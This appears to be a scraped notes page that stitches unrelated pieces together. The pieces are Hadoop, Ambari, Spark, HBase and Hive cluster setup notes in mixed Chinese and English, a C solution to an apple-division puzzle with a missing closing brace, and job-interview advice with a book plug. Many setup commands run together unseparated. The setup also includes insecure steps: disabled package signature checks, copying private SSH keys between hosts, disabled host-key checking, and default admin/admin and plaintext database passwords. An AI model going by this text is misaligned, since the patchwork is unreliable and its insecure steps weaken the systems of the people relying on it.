sed -i 's/ONBOOT=no/ONBOOT=yes/g' /etc/sysconfig/network-scripts/ifcfg-eth4
_____________________________________________________________
Swap Closed
cat >> /etc/sysctl.conf << EOF
vm.swappiness=0
EOF
_____________________________________________________________
Time Zone:
cp  /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime
_____________________________________________________________
*****************************************************************************************************
/etc/sysconfig/network
Hostname
*****************************************************************************************************
/etc/hosts:
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost
172.31.200.7 data1
172.31.200.8 data2
172.31.200.9 data3
why not?
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
172.31.200.7 data1
172.31.200.8 data2
172.31.200.9 data3
*****************************************************************************************************
PackageKit
pkill -9 packagekitd
vim /etc/yum/pluginconf.d/refresh-packagekit.conf
enabled=0
*****************************************************************************************************
THP(Transparent Huge Pages):
echo never > /sys/kernel/mm/redhat_transparent_hugepage/enabled
echo never > /sys/kernel/mm/redhat_transparent_hugepage/defrag
*****************************************************************************************************
ulimit & nproc
[root@data2 yum.repos.d]# vim /etc/security/limits.conf
soft nproc 16384
hard nproc 16384
soft nofile 65536
hard nofile 65536
*****************************************************************************************************
REBOOT all the machine
*****************************************************************************************************
REPO for rhel:
first:
[root@server2 opt]# cd /etc/yum.repos.d/
[root@server2 yum.repos.d]# ls -al
drwxr-xr-x.   2 root root  4096 3月  22 04:02 .
drwxr-xr-x. 182 root root 16384 4月  14 22:27 ..
-rw-r--r--.   1 root root  1991 10月 23 2014 CentOS-Base.repo
-rw-r--r--.   1 root root   647 10月 23 2014 CentOS-Debuginfo.repo
-rw-r--r--.   1 root root   289 10月 23 2014 CentOS-fasttrack.repo
-rw-r--r--.   1 root root   630 10月 23 2014 CentOS-Media.repo
-rw-r--r--.   1 root root  5394 10月 23 2014 CentOS-Vault.repo
-rw-r--r--.   1 root root   270 12月 15 14:36 cloudera.repo
-rw-r--r--.   1 root root   134 12月  8 08:31 rhel65.repo
rm -rf ALL
---->>>>>>we don't get internet connection.
second:
[root@data2 yum.repos.d]# cat centos6.6.repo 
[centos6]
name=cloudera
baseurl=http://172.31.200.216/centos6
enabled=1
gpgcheck=0
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release
scp /etc/yum.repos.d/centos6.6.repo root@Hostname:/etc/yum.repos.d/
yum clean all
yum search lib*
*****************************************************************************************************
SSH:
yum install openssl
yum upgrade openssl
rm -rf ~/.ssh/*
ssh-keygen  -t rsa -f ~/.ssh/id_rsa  -N ''
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
scp -r ~/.ssh root@172.31.200.8:~/.ssh
chmod 600 ~/.ssh
注意：chmod 777 为什么不行？？？
*****************************************************************************************************
jdk:
rpm -ivh jdk-7XXX-linux-XXXX.rpm
echo "JAVA_HOME=/usr/java/latest/">> /etc/environment
java -version
*****************************************************************************************************
NTP:
ntp-master node
 
[root@data1 yum.repos.d]# vim /etc/ntp.conf
server data1 prefer
server 127.127.1.0
fudge 127.127.1.0 stratum 10
service ntpd restart
[root@data1 yum.repos.d]# chkconfig --list ntpd
ntp-master node
/var/spool/cron/root<<EOF
*/10 * * * * /usr/sbin/ntpdate NameNode && /sbin/clock -w
EOF
service ntpd restart
ntpdate -u NameNode
*****************************************************************************************************
/var/www/html：
which httpd
or 
yum install httpd
tar -xzf HDP-UTILS-1.1.0.20-centos6.tar.gz
tar -xzf AMBARI-2.1.2-377-centos6.tar.gz
tar -xzf HDP-2.3.0.0-centos6-rpm.tar.gz
check whether the listening port of http service is blocked.
---->>>>netstat -nltp | grep 80
---->>>>vim /etc/httpd/conf/httpd.conf
change value of the default port
service httpd start
*****************************************************************************************************
Repo for HDP & Ambari
[root@data2 yum.repos.d]# cat ambari.repo 
[Updates-ambari-2.1.2]
name=ambari-2.1.2-Updates
baseurl=http://data1/AMBARI-2.1.2/centos6
gpgcheck=0
enabled=1
[HDP-2.3.0.0]
name=HDP Version-HDP-2.3.0.0
baseurl=http://data1/HDP/centos6/2.x/updates/2.3.0.0
gpgcheck=0
enabled=1
[HDP-UTILS-1.1.0.20]
name=HDP Utils Version - HDP-UTILS-1.1.0.20
baseurl=http://data1/HDP-UTILS-1.1.0.20/repos/centos6
gpgcheck=0
enabled=1
scp /etc/yum.repos.d/ambari.repo root@Hostname:/etc/yum.repos.d/
yum clean all
yum search ambari-agent
yum search Oozie
yum search gangli
*****************************************************************************************************
SO Address:
http://172.31.200.7/HDP/centos6/2.x/updates/2.3.0.0
http://172.31.200.7/HDP-UTILS-1.1.0.20/repos/centos6
*****************************************************************************************************
yum clean all
yum search ambari-server
yum search ambari-agent
yum search oozie
yum remove *****
Master：yum install ambari-serveryum install ambari-agentambari-agent startconf of ambari server:/etc/ambari-server/conf/ambari.properties
Slave:yum install ambari-agentambari-agent start 
ambari-server start 
ambari-server setup -j /usr/java/jdk1.7.0_71/   
--->>>>Run the setup command to configure your Ambari Server, Database, JDK, LDAP, and other options:
--->>>>enter numeric number(n means default)
ambari-server start
http://MasterHostName:8080
Account：admin  Password:admin
*****************************************************************************************************
Logs to see student:
See the log:
cat /var/log/ambari-agent/ambari-agent.lo
cat /var/log/ambari-server/ambari-server.log
*****************************************************************************************************
To Do:
HDFS:
[root@data1 yum.repos.d]# su hdfs -c "hadoop fs -ls /"
[root@data1 yum.repos.d]# su hdfs -c "hadoop fs -mkdir /lgd"
MR:
Spark:
HBase:
Hive:
ES:
*******************************************************************************************************
FAQ
1, The hostname of the machine better be Fully Qualified Domain Name---->>>>>>>hoastname.domain,such as,data.hdp.worker1
2, Zookeeper-Agent端修改Server指向的HOSTNAME, /etc/ambari-agent/conf/ambari-agent.ini,如修改过主机hostname
安装失败后或重新安装先执行ambari-server reset 后 ambari-setup
3, 最后一步安装可能会失败,多数原因是下载包错误引起的,可重复安装直到成功,本人反复几个最终成功了,网络,网络,尤其就朝民,各种干扰!
4, 如果遇到访问https://xxx:8440/ca的错误，升级openssl就可以。
5，Heartbeat lost for the host错误，检查出错节点的ambari-agent是否停止，ambari-angent是python脚本运行的，
可能遇到没有捕捉到的异常，导致进程crash或者停止了。
6，App Timeline server安装出错，retry解决。
7，如果出现乱码：echo 'LANG="en_US.UTF-8"' > /etc/sysconfig/i18n,修改字符集即可解决！
8, 如果安装linux的时候基础包未选择，缺包可以制作cdrom挂载，来安装即可解决！
9, selinux开启 导致本地yum源访问403
10, centosos6.5 openssh 版本bug 导致 agent安装失败,解决 yum upgrade openssl
11, 
*******************************************************************************************************
总结：
1，日志查看，追溯问题。
2，如果要安装一切顺利，可在安装操作系统时把linux基础组件一并安装！补救方案为：yum groupinstall "Compatibility libraries" "Base" "Development tools"yum groupinstall "debugging Tools" "Dial-up Networking Support"
3，
*******************************************************************************************************
备注: + Ambari安装的环境路径:
各台机器的安装目录:
/usr/lib/hadoop
/usr/lib/hbase
/usr/lib/zookeeper
/usr/lib/hcatalog
/usr/lib/hive 
+ Log路径, 这里需要看出错信息都可以在目录下找到相关的日志 
/var/log/hadoop
/var/log/hbase
+ 配置文件的路径 
/etc/hadoop
/etc/hbase
/etc/hive
+ HDFS的存储路径 
/hadoop/hdfs
*******************************************************************************************************
其他1：
安装过程中使用了桌面，火狐等安装命令
yum install firefox
yum groupinstall -y “Desktop” “Desktop Platform” “Desktop Platform
Development”　 “Fonts” 　“General Purpose Desktop”　 “Graphical
Administration Tools”　 “Graphics Creation Tools” 　“Input Methods” 　“X
Window System” 　“Chinese Support [zh]”　“Internet Browser”
iso yum 源来安装一些基础包
sudo mount -o loop /home/whoami/rhel-server-6.7-x86_64-dvd.iso /mnt/cdimg/
$ cat rhel-source.repo
[rhel-Server]
name=Red Hat Server
baseurl=file:///mnt/cdimg
enable=1
gpgcheck=0
*******************************************************************************************************
其他2：
Ambari配置时在Confirm Hosts的步骤时，中间遇到一个很奇怪的问题：总是报错误：
Ambari agent machine hostname (localhost.localdomain) does not match expected ambari server hostname (xxx).
后来修改的/etc/hosts文件中
修改前：
127.0.0.1   xxx localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         xxx localhost localhost.localdomain localhost6 localhost6.localdomain6
修改后：
127.0.0.1   xxx localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         xxx
感觉应该是走的ipv6协议，很奇怪，不过修改后就可以了。

2.hadoop源代码配置
首先配置hosts文件关联主机名和ip地址
host1=
host2=
host3=
=== security shell
rm -rf ~/.ssh/*
ssh-keygen  -t rsa -f ~/.ssh/id_rsa  -N ''
ssh-copy-id -o StrictHostKeyChecking=no $remothostname
ssh $remothostname hostname
######################## Hadoop cluster deploy
1. tar -xzf hadoop-2.7.1.tar.gz
2. add profile
Shell> cat << EOF >/etc/profile.d/hadoop.sh
#!/bin/sh
export JAVA_HOME=/root/BIGDATA/jdk1.8.0_65
export HADOOP_PREFIX=/root/BIGDATA/hadoop-2.7.1
export HADOOP_HOME=\$HADOOP_PREFIX
export HADOOP_CONF_DIR=\$HADOOP_HOME/etc/hadoop
export YARN_CONF_DIR=\$HADOOP_HOME/etc/hadoop
export JAVA_LIBRARY_PATH=\$HADOOP_HOME/lib/native:\$JAVA_LIBRARY_PATH
export LD_LIBRARY_PATH=\$HADOOP_HOME/lib/native:\$LD_LIBRARY_PATH
export CLASSPATH=.:\$JAVA_HOME/lib/dt.jar:\$JAVA_HOME/lib/tools.jar:
export PATH=\$JAVA_HOME/bin:\$HADOOP_HOME/bin:\$HADOOP_HOME/sbin:\${PATH}
EOFShell> source /etc/profile 
3. create hdfs dirs on all hostsHADOOP_LOCAL_BASE_DIR=/opt/local/hdfsmkdir -p ${HADOOP_LOCAL_BASE_DIR}mkdir -p ${HADOOP_LOCAL_BASE_DIR}/dfs/datamkdir -p ${HADOOP_LOCAL_BASE_DIR}/dfs/namemkdir -p ${HADOOP_LOCAL_BASE_DIR}/dfs/snnmkdir -p ${HADOOP_LOCAL_BASE_DIR}/tmpmkdir -p ${HADOOP_LOCAL_BASE_DIR}/yarn/logs
4. config etc/hadoop/1. add all slaves to slavesbigdata1bigdata32.HADOOP_DFS_MASTER=masternodeHADOOP_DFS_SECONDARY_NAMENODE=masternodeYARN_RESOURCE_MANAGER=masternodeJOBHISTORY_SERVER=masternodeJOBTRACKRT_HOST=masternodeHADOOP_TOOL_INSTALL_DIR=/root/BIGDATA/DOCS/hadoop_doc/hadoop_demo#core-site.xmlconf_file=core-site.xmlcp -raf ${HADOOP_TOOL_INSTALL_DIR}/${conf_file}  ${HADOOP_PREFIX}/etc/hadoop/sed -i "s^\${HADOOP_LOCAL_BASE_DIR}^${HADOOP_LOCAL_BASE_DIR}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"sed -i "s^\${HADOOP_DFS_MASTER}^${HADOOP_DFS_MASTER}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"#hdfs-site.xmlconf_file=hdfs-site.xmlcp -raf ${HADOOP_TOOL_INSTALL_DIR}/${conf_file}  ${HADOOP_PREFIX}/etc/hadoop/sed -i "s^\${HADOOP_LOCAL_BASE_DIR}^${HADOOP_LOCAL_BASE_DIR}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"sed -i "s^\${HADOOP_DFS_SECONDARY_NAMENODE}^${HADOOP_DFS_SECONDARY_NAMENODE}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"sed -i "s^\${HADOOP_DFS_MASTER}^${HADOOP_DFS_MASTER}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"#mapreducesite.xmlconf_file=mapred-site.xmlcp -raf ${HADOOP_TOOL_INSTALL_DIR}/${conf_file}  ${HADOOP_PREFIX}/etc/hadoop/sed -i "s^\${JOBTRACKRT_HOST}^${JOBTRACKRT_HOST}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"sed -i "s^\${JOBHISTORY_SERVER}^${JOBHISTORY_SERVER}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"#yarn-site.xmlconf_file=yarn-site.xmlcp -raf ${HADOOP_TOOL_INSTALL_DIR}/${conf_file}  ${HADOOP_PREFIX}/etc/hadoop/sed -i "s^\${YARN_RESOURCE_MANAGER}^${YARN_RESOURCE_MANAGER}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"
      sed -i "s^\${HADOOP_LOCAL_BASE_DIR}^${HADOOP_LOCAL_BASE_DIR}^g" "${HADOOP_PREFIX}/etc/hadoop/${conf_file}"
5. init namenodeShell>hdfs namenode -format cluster1
6. start allShell>$HADOOP_HOME/sbin/start-all.shShell> $HADOOP_HOME/sbin/mr-jobhistory-daemon.sh  start historyserver
===Hadoop check
1. After deploy hadoop.
   Shell>hadoop checknative -a 
   Shell>hadoop jar ${HADOOP_HOME}/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.7.1.jar pi 4 100
   
   Shell> cat <<EOF >/tmp/file1
Hello World Bye World
EOF
   Shell> cat <<EOF >/tmp/file2
Hello Hadoop Goodbye Hadoop
EOF
   Shell> hadoop fs -mkdir /tmp 
   Shell> hadoop fs -copyFromLocal -f /tmp/file1  /tmp/file2  /tmp
   Shell> hadoop jar ${HADOOP_HOME}/share/hadoop/mapreduce/hadoop-mapreduce-examples-2.7.1.jar wordcount  /tmp/file1  /tmp/file2  /tmp/wordcount
   Shell> hadoop fs -cat /tmp/wordcount/part-r-00000
===hadoop Daemon Web Interface
NameNode http://nn_host:port/
Default HTTP port is 50070.
ResourceManager http://rm_host:port/
Default HTTP port is 8088.
#MapReduce JobHistory Server http://jhs_host:port/
Default HTTP port is 19888.
######################## Spark cluster deploy
1. tar -xzf spark-1.6.1-bin-hadoop2.6.tgz
2. add profile
cat << EOF >>/etc/profile.d/hadoop.sh
export SPARK_HOME=/root/BIGDATA/spark-1.6.1-bin-hadoop2.6
export PATH=\${SPARK_HOME}/sbin:\${PATH}:\${SPARK_HOME}/bin:
EOFShell>source /etc/profile
3. create local dirSPARK_LOCAL_BASE_DIR=/opt/local/sparkShell>mkdir -p ${SPARK_LOCAL_BASE_DIR}/tmpShell>hadoop fs -mkdir /sparkHistoryLogs /sparkEventLogs
4. config1. add all slaves to slaves
       Shell>mv slaves.template slavesbigdata1bigdata32.SPARK_MASTER=masternodeHADOOP_DFS_MASTER=masternodeShell> cat << EOF > ${SPARK_HOME}/conf/spark-defaults.conf
spark.master   spark://${SPARK_MASTER}:7077
spark.local.dir   ${SPARK_LOCAL_BASE_DIR}/tmp
spark.master.rest.port   7177
#Spark UI
spark.eventLog.enabled   true
spark.eventLog.dir   hdfs://${HADOOP_DFS_MASTER}:9000/sparkEventLogs
spark.ui.killEnabled   true
spark.ui.port   4040
spark.history.ui.port   18080
spark.history.fs.logDirectory   hdfs://${HADOOP_DFS_MASTER}:9000/sparkHistoryLogs
#
spark.shuffle.service.enabled   false
#
spark.yarn.am.extraJavaOptions   -Xmx3g
spark.executor.extrajavaoptions   -Xmx3g
#Amount of memory to use for the YARN Application Master in client mode
spark.yarn.am.memory   2048m
#The amount of off-heap memory (in megabytes) to be allocated per executor. 
spark.yarn.driver.memoryOverhead   512
#The amount of off-heap memory (in megabytes) to be allocated per driver in cluster mode
spark.yarn.executor.memoryOverhead   512
#Same as spark.yarn.driver.memoryOverhead, but for the YARN Application Master in client mode, fix yarn-client OOM, "ERROR yarn.ApplicationMaster: RECEIVED SIGNAL 15: SIGTERM"
spark.yarn.am.memoryOverhead   1024  
  
EOFShell> cat << EOF > ${SPARK_HOME}/conf/spark-env.sh
SPARK_WORKER_WEBUI_PORT=8081
SPARK_WORKER_DIR=\${SPARK_HOME}/work
#SPARK_LOCAL_DIRS=\${SPARK_WORKER_DIR}
EOF
5. start all
Shell> ${SPARK_HOME}/sbin/start-all.sh
check cluster status
http://${SPARK_MASTER}:8080
===Spark Daemon Web Interface
spark.history.ui.port 18080
spark master 8080
http://${SPARK_MASTER}:port/
===Spark check
1. Spark Standalone (client, cluster(spark.master.rest.port))
  # Run application locally on 1 cores
  Shell>  ${SPARK_HOME}/bin/spark-submit \
  --class org.apache.spark.examples.SparkPi \
  --master spark://masternode:7077 \
  --deploy-mode  client \
   ${SPARK_HOME}/lib/spark-examples*.jar \
  10
  # Run on a Spark standalone cluster
  Shell>  ${SPARK_HOME}/bin/spark-submit \
  --class org.apache.spark.examples.SparkPi \
  --master spark://$SPARK_MASTER:7177 \
  --deploy-mode  cluster \
  --executor-memory 1G \
  --total-executor-cores 1 \
   ${SPARK_HOME}/lib/spark-examples*.jar \
  10
  
   #spark shell
   Shell> ${SPARK_HOME}/bin/spark-shell --master spark://$SPARK_MASTER:7077
   
2. Spark on Yarn (It needn't start spark cluster, only need start hadoop)#run yarn-clientShell> ${SPARK_HOME}/bin/spark-submit --class org.apache.spark.examples.SparkPi \--master yarn-client \
    --driver-java-options '-Xmx3096m'  \
    --conf spark.executor.extrajavaoptions=-Xmx3096m  \
    --executor-memory 3096m  \
    --num-executors  1  \
    --conf spark.yarn.am.memoryOverhead=1024  \
    ${SPARK_HOME}/lib/spark-examples*.jar \
    10
    #run yarn-clusterShell> ${SPARK_HOME}/bin/spark-submit --class org.apache.spark.examples.SparkPi \--master yarn \--deploy-mode  cluster \
    --driver-memory 2g \
    --executor-memory 2g \
    ${SPARK_HOME}/lib/spark-examples*.jar \
    10
######################## Hbase cluster deploy
1. Shell> tar -xzf hbase-1.1.4-bin.tar.gz
2. add profile
cat << EOF >>/etc/profile.d/hadoop.sh
export HBASE_HOME=/root/BIGDATA/hbase-1.1.4
export PATH=\${PATH}:\${HBASE_HOME}/bin:
EOFShell>source /etc/profile
3. create local dirHBASE_ROOTDIR=/hbaseHBASE_TMP_DIR=/opt/local/hbaseShell> hadoop fs -mkdir ${HBASE_ROOTDIR}Shell> mkdir -p ${HBASE_TMP_DIR}
4. config1. add all hosts to regionserversbigdata1bigdata22. modify hbase-site.xml
cat <<EOF >${HBASE_HOME}/conf/hbase-site.xml
<configuration>
  <property>
    <name>hbase.rootdir</name>
    <value>hdfs://masternode:9000/hbase </value>
    <description>The directory shared by RegionServers.
    Default: \${hbase.tmp.dir}/hbase
    </description>
  </property>
  <property>
    <name>hbase.zookeeper.quorum</name>
    <value>masternode,slavesnode</value>
    <description>The directory shared by RegionServers.
    </description>
  </property>
  <property>
    <name>hbase.tmp.dir</name>
    <value>/opt/local/hbase</value>
    <description>Temporary directory on the local filesystem
    Default: \${java.io.tmpdir}/hbase-${user.name}.
    </description>
  </property>
  <property>
    <name>hbase.cluster.distributed</name>
    <value>true</value>
    <description>The mode the cluster will be in. Possible values are
      false: standalone and pseudo-distributed setups with managed Zookeeper
      true: fully-distributed with unmanaged Zookeeper Quorum (see hbase-env.sh)
    </description>
  </property>
  <!--
  <property>
    <name>hbase.fs.tmp.dir</name>
    <value></value>
    <description>A staging directory in default file system (HDFS) for keeping temporary data
    Default: /user/\${user.name}/hbase-staging
    </description>
  </property>
  <property>
    <name>hbase.local.dir</name>
    <value></value>
    <description>Directory on the local filesystem to be used as a local storage.
    Default: ${hbase.tmp.dir}/local/
    </description>
  </property>
  <property>
    <name>hbase.master.port</name>
    <value>16000</value>
    <description>The port the HBase Master should bind to.
    Default: 16000
    </description>
  </property>
  <property>
    <name>hbase.master.info.port</name>
    <value>16010</value>
    <description>The port for the HBase Master web UI. Set to -1 if you do not want a UI instance run.
    Default: 16010
    </description>
  </property>
  <property>
    <name>hbase.regionserver.port</name>
    <value>16020</value>
    <description>The port the HBase RegionServer binds to.
    Default: 16020
    </description>
  </property>
  <property>
    <name>hbase.regionserver.info.port</name>
    <value>16030</value>
    <description>The port for the HBase RegionServer web UI Set to -1 if you do not want the RegionServer UI to run.
    Default: 16030
    </description>
  </property>
  <property>
    <name>hbase.zookeeper.peerport</name>
    <value>2888</value>
    <description>Port used by ZooKeeper peers to talk to each other
    Default: 2888
    </description>
  </property>
  <property>
    <name>hbase.zookeeper.leaderport</name>
    <value>3888</value>
    <description>Port used by ZooKeeper for leader election
    Default: 3888
    </description>
  </property>
  <property>
    <name>hbase.zookeeper.property.dataDir</name>
    <value></value>
    <description>Property from ZooKeeper’s config zoo.cfg. The directory where the snapshot is stored.
    Default: ${hbase.tmp.dir}/zookeeper
    </description>
  </property>
  <property>
    <name>hbase.zookeeper.property.clientPort</name>
    <value>2181</value>
    <description>Property from ZooKeeper’s config zoo.cfg. The port at which the clients will connect.
    Default: 2181
    </description>
  </property>
  -->
  
</configuration>
EOF3. ln -s $HADOOP_HOME/etc/hadoop/hdfs-site.xml  ${HBASE_HOME}/conf/hdfs-site.xml 4. ulimit 咿nproccat <<EOF > /etc/security/limits.conf
 root -       nofile  32768
 root soft/hard nproc 32000
EOF
5. start allShell> ${HBASE_HOME}/bin/start-hbase.sh
===Hbase Daemon Web Interface
hbase.master.info.port  16010
hbase.regionserver.info.port  16030
http://${HBASE_MASTER}:port/
===Hbase check
1. run hbase shell
Shell> ${HBASE_HOME}/bin/hbase shell
hbase(main):003:0> create 'test', 'cf'
0 row(s) in 1.2200 seconds
hbase(main):003:0> list 'table'
test
1 row(s) in 0.0550 seconds
hbase(main):004:0> put 'test', 'row1', 'cf:a', 'value1'
0 row(s) in 0.0560 seconds
hbase(main):005:0> put 'test', 'row2', 'cf:b', 'value2'
0 row(s) in 0.0370 seconds
hbase(main):006:0> put 'test', 'row3', 'cf:c', 'value3'
0 row(s) in 0.0450 seconds
hbase(main):007:0> scan 'test'
ROW        COLUMN+CELL
row1       column=cf:a, timestamp=1288380727188, value=value1
row2       column=cf:b, timestamp=1288380738440, value=value2
row3       column=cf:c, timestamp=1288380747365, value=value3
3 row(s) in 0.0590 seconds
hbase(main):008:0> get 'test', 'row1'
COLUMN      CELL
cf:a        timestamp=1288380727188, value=value1
1 row(s) in 0.0400 seconds
hbase(main):012:0> disable 'test'
0 row(s) in 1.0930 seconds
hbase(main):013:0> drop 'test'
0 row(s) in 0.0770 seconds 
hbase(main):014:0> exit
######################## Hive cluster deploy
1. tar -xzf apache-hive-2.0.0-bin.tar.gz
2. add profile
cat << EOF >>/etc/profile.d/hadoop.sh
export HIVE_HOME=/root/BIGDATA/apache-hive-2.0.0-bin
export HIVE_CONF_DIR=\${HIVE_HOME}/conf
export PATH=\${HIVE_HOME}/bin:\${PATH}
EOFShell>source /etc/profile
3. create local dir
   $HADOOP_HOME/bin/hadoop fs -mkdir /tmp
   $HADOOP_HOME/bin/hadoop fs -mkdir -p /user/hive/warehouse
   $HADOOP_HOME/bin/hadoop fs -chmod g+w  /tmp
   $HADOOP_HOME/bin/hadoop fs -chmod g+w  /user/hive/warehouse
   Shell> mkdir -p  ${HBASE_TMP_DIR}
4. config =M1. [ Local Embedded Derby ]HIVE_LOCAL_WAREHOUSE=/opt/hive/warehouseShell> mkdir -p  ${HIVE_LOCAL_WAREHOUSE}Shell>cat <<EOF > ${HIVE_CONF_DIR}/hive-site.xml
<configuration>
<property>
  <name>javax.jdo.option.ConnectionURL</name>
  <value>jdbc:derby:;databaseName=metastore_db;create=true</value>
  <description>JDBC connect string for a JDBC metastore</description>
</property>
<property>
  <name>javax.jdo.option.ConnectionDriverName</name>
  <value>org.apache.derby.jdbc.EmbeddedDriver</value>
  <description>Driver class name for a JDBC metastore</description>
</property>
<property>
  <name>javax.jdo.option.ConnectionUserName</name>
  <value>APP</value>
  <description>username to use against metastore database</description>
</property>
<property>
  <name>javax.jdo.option.ConnectionPassword</name>
  <value>mine</value>
  <description>password to use against metastore database</description>
</property>
<property>
  <name>hive.metastore.warehouse.dir</name>
  <value>${HIVE_LOCAL_WAREHOUSE}</value>
  <description>unit test data goes in here on your local filesystem</description>
</property>
</configuration>
EOFShell> $HIVE_HOME/bin/schematool -initSchema -dbType derbyShell> $HIVE_HOME/bin/schematool -dbType derby-infoShell> $HIVE_HOME/bin/hive=M2. [Remote Metastore Server Derby]Shell> tar -xzf db-derby-10.12.1.1-bin.tar.gzShell> cd db-derby-10.12.1.1-binShell> mkdir dataShell> cd dataShell> ../bin/startNetworkServer  -h 172.31.200.110 -p 1527  &Shell> cp -raf  ../lib/derbyclient.jar   ../lib/derbytools.jar  $HIVE_HOME/lib/DERBY_SERVER_HOST=masternodeShell>cat <<EOF > ${HIVE_CONF_DIR}/hive-site.xml
<configuration>
<property>
  <name>javax.jdo.option.ConnectionURL</name>
  <value>jdbc:derby://${DERBY_SERVER_HOST}:1527/hive_meta;create=true</value>
  <description>JDBC connect string for a JDBC metastore</description>
</property>
<property>
  <name>javax.jdo.option.ConnectionDriverName</name>
  <value>org.apache.derby.jdbc.ClientDriver</value>
  <description>Driver class name for a JDBC metastore</description>
</property>
<property>
    <name>datanucleus.schema.autoCreateAll</name>
    <value>true</value>
    <description>creates necessary schema on a startup if one doesn't exist. set this to false, after creating it once</description>
</property>
<property>
  <name>javax.jdo.option.ConnectionUserName</name>
  <value>app</value>
  <description>username to use against metastore database</description>
</property>
<property>
  <name>javax.jdo.option.ConnectionPassword</name>
  <value>app</value>
  <description>password to use against metastore database</description>
</property>
<property>
  <name>hive.metastore.warehouse.dir</name>
  <!-- base hdfs path -->
  <value>/user/hive/warehouse</value>
  <description>base hdfs path :location of default database for the warehouse</description>
</property>
  
<!-- hive client -->
 <!-- thrift://<host_name>:<port> -->
 <property>
      <name>hive.metastore.uris</name>
      <value>thrift://masternode:9083</value>
 </property>
</configuration>
EOF#start metastore service$HIVE_HOME/bin/hive --service metastore &#star thiveserver service$HIVE_HOME/bin/hiveserver2 &
5. start$HIVE_HOME/bin/hivehive> CREATE TABLE pokes (foo INT, bar STRING);hive> CREATE TABLE invites (foo INT, bar STRING) PARTITIONED BY (ds STRING);hive> SHOW TABLES;hive> SHOW TABLES '.*s';hive> DESCRIBE invites;hive> LOAD DATA LOCAL INPATH '/root/BIGDATA/apache-hive-2.0.0-bin/examples/files/kv1.txt' OVERWRITE INTO TABLE pokes;
======# #Remote Metastore Server   $HIVE_HOME/bin/hive --service metastore -p 9083#Running HiveServer2 and Beeline   $HIVE_HOME/bin/hiveserver2   $HIVE_HOME/bin/beeline -u jdbc:hive2://localhost:10000#Running HCatalog   $HIVE_HOME/hcatalog/sbin/hcat_server.sh
   $HIVE_HOME/hcatalog/bin/hcat#Running WebHCat   $HIVE_HOME/hcatalog/sbin/webhcat_server.sh
####### pig
2. add profile
cat << EOF >>/etc/profile.d/hadoop.sh
export PIG_HOME=/BIGDATA/pig-0.15.0
export PATH=\${PIG_HOME}/bin:\${PATH}
EOFShell>source /etc/profile









其实挺坑爹的一个题目：
也不知道考察的重点是啥，大体思路是从2个人分开始算起，自己找到规律了，写代码实现。

讨论帖：
http://bbs.csdn.net/topics/391835433?page=1#post-400493630





实现代码一：

#include <stdio.h>
#include <math.h>
size_t apple(size_t b)
{
    return b>0?pow(b,b)-(b-1):0;
}
int main()
{
    printf("%d\n",apple(8));
    return 0;
}



实现代码2：a题比较好，面试估计不能这么写：
int main()
 {
 switch (getchar() - '0')
 {
 case 2: puts("3"); break;
 case 3: puts("25"); break;
 case 4: puts("253"); break;
 case 5: puts("3121"); break;
 case 6: puts("46651"); break;
 case 7: puts("823537"); break;
 case 8: puts("16777209"); break;
 }


﻿﻿
﻿﻿









突然看到去年找的关于《理想工作环境》的相关资料，现在贴出来分享给大家。这个源于一个面试题， 忘了是哪家公司问我，你心中理想的工作环境是怎样的，我一时语塞，甚至从来没有考虑过这样的问题。理想的工作环境？！能有人要我就非常不错了，后来还是找了非常多的资料总结了总结。因为准备面试所以也找了不少双语的材料，各位凑合看吧。

Can you describe your ideal working environment to me?
Alternative and related questions:
Which of your previous working environments was the best?
The meaning behind the question:
As with other questions which ask you to describe your ‘ideal’ of something work-related, the interviewer is attempting to assess how closely your ideal fits with the reality of their organisation.  Unless you see through this aspect of their question, you could easily reveal reasons for them to notch up black marks on your application.  They’re testing your compatibility.
Your answer:

How much do you know about the working environment in the organisation to which you’re applying?  Shallow as it may seem, this is what you need to be describing.

With a bit of luck, you’ll already have been able to glean quite a bit of useful information from the interviewer during the course of your interview – information which you can now feed back to them.

Example:

My ideal working environment is one where there’s a good sense of team spirit.  A strong work ethic is obviously important but the human side is also important.  I enjoy working with people who have a decent sense of humour and who, while they might take their work very seriously, don’t necessarily take themselves overly seriously!  I like people who are down to earth but who have a dynamic and progressive approach to their work.  I really enjoy working as part of a highly committed and professional team.

Word of warning:
Avoid saying anything along the lines of the way they’ve described their organisation’s working environment as sounding like your idea of the ideal working environment.  Don’t be seen to be overtly sucking up!  Subtly does it.


The Interview Question & Answer Book
The Interview Question and Answer Book	（推荐一本书）



图书
介绍





Take the fear out of your interview and never be stuck for the right answer to even the toughest questions with The Interview Question & Answer Book.The job market is fierce, competition has never been greater and it’s important that you can grab every opportunity for competitive advantage and stay one step ahead. Written by one of the world’s leading careers experts and bestselling author of The Interview Book, this definitive guide to questions and answers encourages every job-hunter to think on your feet and express your individuality while supplying ideal responses to interview questions so that you’re seen as the ideal candidate for the job.






https://www.amazon.co.uk/gp/product/0273763717?ie=UTF8&tag=thcvce-21

理想工作环境的核心----充分的自由
管理大师彼得·杜拉克指出，理想的工作环境要能够授权给员工，免除不必要的监督，员工知道公司对他们的期望，也很清楚公司如何评量他们的工作。
用计算机的时候，我是半躺在椅子上。思考的时候，我习惯把脚翘的比头还高，坐相就别说有多难看了。但公司要的是我写的程序，不是要我来当美姿示范的。所有的布置装潢、茶点饮料供应，以及充足的软硬件供应，都是为了能提供一个不同一般的工作环境。以促进软件人员的生产力来说，这些投资相对来说是很便宜的
Management guru Peter Drucker pointed out, the ideal working environment for employees to be able to authorize, eliminating unnecessary oversight, employees know their company’s expectations, it is very clear how companies evaluate their work.
